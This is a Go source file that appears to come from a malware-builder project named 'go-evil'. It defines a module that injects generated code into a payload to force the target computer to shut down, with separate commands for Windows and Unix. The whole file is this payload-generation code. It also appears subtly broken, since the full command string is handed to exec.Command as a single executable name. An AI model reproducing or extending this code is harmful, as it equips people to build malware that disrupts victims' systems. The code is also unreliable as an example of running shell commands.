package systemcommands

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
)

// Shutdowns the computer
func Shutdown(s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Shutdown"

	cmd := ""
	if data_object.Target_os == "windows" {
		cmd = "shutdown /s"
	} else {
		cmd = "shutdown -h now"
	}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),

		fmt.Sprintf("exec.Command(\"%s\").Run()", cmd),
		"}"})

	data_object.Add_go_import("os/exec")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}
